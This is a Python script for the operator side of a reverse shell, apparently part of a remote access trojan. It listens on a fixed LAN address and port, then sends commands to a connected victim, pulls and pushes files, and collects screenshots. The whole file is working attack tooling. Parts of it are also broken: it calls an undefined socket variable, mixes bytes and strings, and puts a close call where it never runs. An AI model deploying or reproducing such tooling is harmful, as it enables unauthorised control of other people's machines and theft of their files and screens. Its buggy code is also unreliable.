#!/usr/bin/python3

import socket
import os
from termcolor import colored
import base64
import json

def reliable_recv():
    data = ""
    while True:
        try:
            data += sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)


def shell():
    global count
    while True:
        command = input("$hell:%s > "% str(IP))
        target.send(command.encode("utf-8"))
        if command == "q" or command == "exit":
            break
            sock.close()
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:5] == "mkdir" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:],"wb") as f:
                file_data = reliable_recv()
                f.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            with open(command[7:],"rb") as f:
                try:
                    reliable_send(base64.b64encode(f.read()))
                except Exception as err:
                    print(str(err))
                    reliable_send(str(err))
        elif command[:10] == "screenshot":
            try:
                with open("screenshot%d.png" % count,"wb") as f:
                    image = reliable_recv()
                    image_decoded = base64.b64decode(image)
                    if image_decoded[:4] == "[!!]":
                        print(image_decoded)
                    else:
                        count += 1
                        f.write(image_decoded)
            except Exception as err:
                print(str(err))
                reliable_send("[!!] Failed To receive data")

        message = target.recv(1024)
        print(colored("[+] output :\n","green")+message.decode("utf-8")+"\n")


def server():
    global s
    global IP
    global target
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("192.168.0.107",54321))
    s.listen(5)
    print(colored("[+] Listening for Incoming Connections",'green'))
    target,IP = s.accept()
    print(colored("[+] connection established from :%s" % str(IP),'green'))


if __name__ == "__main__":
    count = 1
    server()
    shell()